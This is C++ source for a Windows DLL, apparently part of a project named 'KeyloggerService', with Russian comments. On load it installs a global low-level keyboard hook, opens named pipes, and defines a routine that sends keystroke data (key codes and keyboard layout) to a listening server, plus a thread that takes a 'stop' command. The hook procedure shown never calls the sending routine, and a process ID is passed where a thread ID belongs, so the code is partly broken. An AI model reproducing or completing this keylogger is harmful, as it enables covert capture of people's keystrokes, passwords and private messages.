#include <Windows.h>
#include <vector>
#include <thread>
#include <defines.h>
#include <fstream>
#include <sstream>
#include <iostream>
#define TRAVERSE_FLAG_DEBUG   (1u << 1)
#pragma comment (lib, "ntdll.lib")

// Глобальная переменная для механизма событий
HANDLE hEvent;
HANDLE hThread;
HMODULE hLib;
HHOOK g_hHook;
HANDLE writePipe;

void* get_teb(
    const DWORD tid,   // in
    const DWORD flags   // in, optional
)
{
    static NTSTATUS(__stdcall * NtQueryInformationThread)(
        HANDLE ThreadHandle,
        int ThreadInformationClass,
        PVOID ThreadInformation,
        ULONG ThreadInformationLength,
        PULONG ReturnLength
        );

    struct /* THREAD_BASIC_INFORMATION */
    {
        LONG ExitStatus;
        PVOID TebBaseAddress;
        struct
        {
            HANDLE UniqueProcess;
            HANDLE UniqueThread;
        } ClientId;
        ULONG_PTR AffinityMask;
        LONG Priority;
        LONG BasePriority;
    } tbi;

    LONG status = 0;
    HANDLE thread = NULL;
    void* return_code = NULL;


    if (!NtQueryInformationThread)
    {
        SetLastError(0); // error code is evaluated on success
        *(FARPROC*)&NtQueryInformationThread =
            (FARPROC)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationThread");

        if ((flags & TRAVERSE_FLAG_DEBUG))
        {
            printf("GetProcAddress() %s. GLE: %lu, NtQueryInformationThread: 0x%p.\n",
                (NtQueryInformationThread ? "success" : "error"),
                GetLastError(),
                NtQueryInformationThread
            );
        }

        if (!NtQueryInformationThread)
            goto cleanup;
    }

    SetLastError(0); // error code is evaluated on success
    thread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, tid);

    if ((flags & TRAVERSE_FLAG_DEBUG))
    {
        printf("OpenThread() %s. tid: %lu, GLE: %lu, Handle: 0x%p.\n",
            (thread ? "success" : "error"),
            tid,
            GetLastError(),
            thread
        );
    }

    if (!thread)
        goto cleanup;

    /* request ThreadBasicInformation */
    status = NtQueryInformationThread(thread, 0, &tbi, sizeof(tbi), NULL);

    if ((flags & TRAVERSE_FLAG_DEBUG))
    {
        printf("NtQueryInformationThread() %s. status: 0x%08X.\n",
            ((status) ? "!= STATUS_SUCCESS" : "== STATUS_SUCCESS"),
            (unsigned)status
        );
    }

    if (status) // || ( tbi.ExitStatus != STATUS_PENDING ) )
        goto cleanup;

    return_code = tbi.TebBaseAddress;

cleanup:

    if (thread)
    {
        BOOL ret = 0;

        SetLastError(0); // error code is evaluated on success
        ret = CloseHandle(thread);

        if ((flags & TRAVERSE_FLAG_DEBUG))
        {
            printf("CloseHandle() %s. GLE: %lu, Handle: 0x%p\n",
                (ret ? "success" : "error"),
                GetLastError(),
                thread
            );
        }

        thread = NULL;
    }

    return return_code;
}

DWORD dwCurrentProcessId;
HANDLE hCurrentProcess;
DWORD dwMainThreadId;

bool stopFlag = false;

void Stop()
{
    stopFlag = true;
}

DWORD WINAPI readCommandThread(LPVOID lpParam)
{
    HANDLE readPipe = CreateFile(
        L"\\\\.\\pipe\\myreadpipe",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (readPipe == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open named pipe: " << GetLastError() << std::endl;
        if (readPipe != NULL)CloseHandle(readPipe);
        return 1;
    }

    while (!stopFlag) {
        // Получение ответа от сервера
        char buffer[256];
        DWORD bytesRead = 0;
        if (!ReadFile(readPipe, buffer, sizeof(buffer), &bytesRead, NULL) || bytesRead == 0) {
            //std::cerr << "Failed to read data from named pipe: " << GetLastError() << std::endl;
            std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\HookDll.log", std::ios_base::app);
            if (outFile.is_open()) {
                outFile << "Failed to read data from named pipe: " << GetLastError() << std::endl;
                outFile.close();
            }
            CloseHandle(readPipe);
            return 1;
        }

        // Обработка ответа от сервера
        if (std::string(buffer).find("stop") != std::string::npos) {
            Stop();
        }

        
        //std::cout << "Received from server: " << std::string(buffer, bytesRead) << std::endl;
        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\HookDll.log", std::ios_base::app);
        if (outFile.is_open()) {
            outFile << "Received from server: " << std::string(buffer, bytesRead) << std::endl;
            outFile.close();
        }

        // Проверка флага stopFlag
        if (stopFlag) {
            CloseHandle(readPipe);
            return 0;
        }

        // Задержка для демонстрации работы в потоке
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

void sendData(int keyLayout, int nCode, WPARAM wParam, LPARAM lParam) {
    if (!writePipe)return;

    KeyInfo info;
    info.lang = keyLayout;
    info.pnCode = nCode;
    info.pwParam = wParam;
    info.plParam = lParam;

    // Размер структуры
    std::size_t dataSize = sizeof(info);

    DWORD bytesWritten = 0;
    WriteFile(writePipe, &dataSize, sizeof(dataSize), &bytesWritten, NULL);
    if (bytesWritten != sizeof(dataSize))
    {
        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\HookDll.log", std::ios_base::app);
        if (outFile.is_open()) {
            outFile << "Failed write structure size to named pipe: " << GetLastError() << std::endl;
            outFile.close();
        }
    }

    bytesWritten = 0;
    WriteFile(writePipe, &info, sizeof(info), &bytesWritten, NULL);
    if (bytesWritten != sizeof(info))
    {
        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\HookDll.log", std::ios_base::app);
        if (outFile.is_open()) {
            outFile << "Failed write structure size to named pipe: " << GetLastError() << std::endl;
            outFile.close();
        }
    }
}

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{

    if (nCode == HC_ACTION) {
        HWND window = GetForegroundWindow();
        HKL keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(window, NULL));
        int keyLayout = reinterpret_cast<int>(keyboardLayout);

    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

BOOL InstallHook(DWORD dwThreadId)
{
    std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\output2.txt", std::ios_base::app);
    if (outFile.is_open()) {
        outFile << "One" << std::endl;
    }

    DWORD dwThisThreadId = GetWindowThreadProcessId(GetForegroundWindow(), NULL);

    AttachThreadInput(dwThreadId, dwThisThreadId, TRUE);

    if (outFile.is_open())outFile.close();

    hLib = LoadLibrary(TEXT("HookDll"));

    if (hLib == NULL) {
        return FALSE;
    }

    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, hLib, 0);

    if (g_hHook != NULL)
    {
        return TRUE;
    }
    return FALSE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) 
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Создаем событие
        hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
         // получить идентификатор текущего процесса
        dwCurrentProcessId = GetCurrentProcessId();
        dwMainThreadId = (DWORD)get_teb(dwCurrentProcessId, NULL);

        writePipe = CreateFile(
            L"\\\\.\\pipe\\mywritepipe",
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            0,
            NULL);

        if (writePipe == INVALID_HANDLE_VALUE) {
            //std::cerr << "Failed to open named pipe: " << GetLastError() << std::endl;
            std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\HookDll.log", std::ios_base::app);
            if (outFile.is_open()) {
                outFile << "Failed to open named pipe: " << GetLastError() << std::endl;
                outFile.close();
            }
            break;
        }

        // установить хук в главном потоке текущего процесса
        if (InstallHook(dwMainThreadId)) {
            // Создаем поток, который будет выполнять бесконечную функцию
            hThread = CreateThread(NULL, 0, readCommandThread, NULL, 0, NULL);

            // Проверяем успешность создания потока
            if (hThread == NULL)
            {
                UnhookWindowsHookEx(g_hHook);
                // Обработка ошибки
                return FALSE;
            }
        }   
        break;
    case DLL_PROCESS_DETACH:
        // Сигнализируем потоку, что нужно завершить работу
        SetEvent(hEvent);

        // Ждем завершения потока
        WaitForSingleObject(hThread, INFINITE);

        // Закрываем дескриптор события и потока
        if (hEvent != NULL)CloseHandle(hEvent);
        if(hThread != NULL)CloseHandle(hThread);
        if (writePipe != NULL && writePipe != INVALID_HANDLE_VALUE) {
            CloseHandle(writePipe);
        }

        FreeLibrary(hModule);
        break;
    }
    return TRUE;
}
